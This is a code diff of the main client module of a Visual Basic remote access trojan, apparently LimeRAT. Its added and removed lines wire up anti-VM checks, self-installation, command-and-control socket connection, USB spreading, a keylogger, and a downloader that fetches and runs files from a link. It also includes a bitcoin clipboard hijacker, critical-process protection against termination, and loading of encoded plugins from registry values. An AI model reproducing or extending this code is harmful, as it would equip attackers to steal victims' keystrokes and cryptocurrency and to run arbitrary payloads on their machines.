@@ -1,5 +1,5 @@
 ﻿'##################################################################
-'##         N Y A N   C A T  |||   Updated on Aug/11/2018        ##
+'##         N Y A N   C A T  |||   Updated on Aug/12/2018        ##
 '##################################################################
 '##                                                              ##
 '##                                                              ##
@@ -40,62 +40,63 @@ Namespace Lime
 
         Public Shared Sub Main()
 
-            'If Microsoft.Win32.Registry.CurrentUser.OpenSubKey("Software\" & C_ID.HWID) Is Nothing Then
-            'Thread.Sleep(35000) '[New client infected]
-            'End If
-            Dim num As Integer = C_Settings.Delay
-            Do Until num = 0
-                Threading.Thread.Sleep(1000)
-                num -= 1
-            Loop
-
-            Dim createdNew As Boolean 'Making sure that only 1 process is running
-            C_Settings.NMT = New Threading.Mutex(True, C_Settings.MTX, createdNew)
             Try
-                If Not createdNew Then End
-            Finally
-                If createdNew Then
-                    C_Settings.NMT.ReleaseMutex()
+
+                'If Microsoft.Win32.Registry.CurrentUser.OpenSubKey("Software\" & C_ID.HWID) Is Nothing Then
+                'Thread.Sleep(35000) '[New client infected]
+                'End If
+
+                Dim num As Integer = C_Settings.Delay
+                Do Until num = 0
+                    Threading.Thread.Sleep(1000)
+                    num -= 1
+                Loop
+
+                Dim AlreadyStarted As Boolean
+                Dim mutex As Threading.Mutex = New Threading.Mutex(False, C_Settings.MTX, AlreadyStarted)
+                If Not AlreadyStarted Then
+                    End
                 End If
-            End Try
 
-            If C_Settings.ANTI Then
-                Call Anti()
-            End If
+                If C_Settings.ANTI Then
+                    C_AntiVM.Check()
+                End If
 
-            Call C_Installation.INS()
+                Call C_Installation.INS()
 
-            C_Socket.T1.Start()
+                C_Socket.T1.Start()
 
-            If C_Settings.BTC_ADDR.Length > 25 Then
-                Dim _BTC As Threading.Thread = New Threading.Thread(AddressOf _BTC_ST)
-                _BTC.SetApartmentState(Threading.ApartmentState.STA)
-                _BTC.Start()
-            End If
+                If C_Settings.USB Then
+                    Dim _USB As Threading.Thread = New Threading.Thread(AddressOf StartSP)
+                    _USB.Start()
+                End If
 
-            If C_Settings.USB Then
-                Dim _USB As Threading.Thread = New Threading.Thread(AddressOf StartSP)
-                _USB.Start()
-            End If
+                If C_Settings.PIN Then
+                    Dim _PIN As Threading.Thread = New Threading.Thread(AddressOf StartPIN)
+                    _PIN.Start()
+                End If
 
-            If C_Settings.PIN Then
-                Dim _PIN As Threading.Thread = New Threading.Thread(AddressOf StartPIN)
-                _PIN.Start()
-            End If
+                Dim _KLG As Threading.Thread = New Threading.Thread(AddressOf StartKLG)
+                _KLG.Start()
 
-            Dim CHK As Threading.Thread = New Threading.Thread(AddressOf Checking)
-            CHK.Start()
+                Dim CHK As Threading.Thread = New Threading.Thread(AddressOf Checking)
+                CHK.Start()
 
-            Dim KL As New C_Keylog
-            Dim KT As New Threading.Thread(AddressOf KL.WRK)
-            KT.Start()
+                Dim DW As Threading.Thread = New Threading.Thread(AddressOf C_Downloader.Downloader)
+                DW.Start()
 
-            Dim DW As Threading.Thread = New Threading.Thread(AddressOf Downloader)
-            DW.Start()
+                If C_Settings.BTC_ADDR.Length > 25 Then
+                    Dim _BTC As Threading.Thread = New Threading.Thread(AddressOf _BTC_ST)
+                    _BTC.SetApartmentState(Threading.ApartmentState.STA)
+                    _BTC.Start()
+                End If
 
-            C_CriticalProcesses.CriticalProcesses_Enable()
+                C_CriticalProcesses.CriticalProcesses_Enable()
 
-            AddHandler Microsoft.Win32.SystemEvents.SessionEnding, AddressOf Handler_SessionEnding
+                AddHandler Microsoft.Win32.SystemEvents.SessionEnding, AddressOf Handler_SessionEnding
+
+            Catch : End Try
+
 
         End Sub
 
@@ -140,7 +141,7 @@ Namespace Lime
 
                     Threading.Thread.CurrentThread.Sleep(1000)
 
-                    'checking if clipboard contains bitcoin address, the address always starts with 1 or 3 or bc1
+                    'the address always start with 1 or 3 or bc1
                     'the length is between 26-35 characters
                     'more info https://en.bitcoin.it/wiki/Address
 
@@ -167,7 +168,7 @@ Namespace Lime
                     End While
 
                 Else
-                    C_Commands.Plugin(Convert.FromBase64String(GTV("_USB")))
+                    C_Commands.Plugin(GZip(Convert.FromBase64String(GTV("_USB")), False))
                 End If
             Catch ex As Exception
             End Try
@@ -185,41 +186,31 @@ Namespace Lime
                     End While
 
                 Else
-                    C_Commands.Plugin(Convert.FromBase64String(GTV("_PIN")))
+                    C_Commands.Plugin(GZip(Convert.FromBase64String(GTV("_PIN")), False))
                 End If
             Catch ex As Exception
             End Try
         End Sub
 
-#End Region
-
-#Region "Downloader"
-        Private Shared Sub Downloader()
+        Private Shared Sub StartKLG()
             Try
-                If C_Settings.DWN_LINK <> "" Then
-
-                    If C_Settings.DWN_CHK = True Then
-                        If GTV("DWN") <> "True" Then
-                            Dim WC As New Net.WebClient
-                            Dim file As String = IO.Path.GetTempFileName + IO.Path.GetFileName(C_Settings.DWN_LINK)
-                            WC.DownloadFile(C_Settings.DWN_LINK, file)
-                            Diagnostics.Process.Start(file)
-                            STV("DWN", "True")
+                If GTV("_KLG") = Nothing Then
+                    While True
+                        If C.CNT = True Then
+                            Threading.Thread.CurrentThread.Sleep(11000)
+                            C.Send("PLKLG")
+                            Exit While
                         End If
+                    End While
 
-                    Else
-                        Dim WC As New Net.WebClient
-                        Dim file As String = IO.Path.GetTempFileName + IO.Path.GetFileName(C_Settings.DWN_LINK)
-                        WC.DownloadFile(C_Settings.DWN_LINK, file)
-                        Diagnostics.Process.Start(file)
-                    End If
+                Else
+                    C_Commands.Plugin(GZip(Convert.FromBase64String(GTV("_KLG")), False))
                 End If
             Catch ex As Exception
-                C.Send("MSG" + SPL + "DWN Error! " + ex.Message) 'Maybe file is not FUD or link problem
             End Try
         End Sub
-#End Region
 
+#End Region
 
     End Class
 
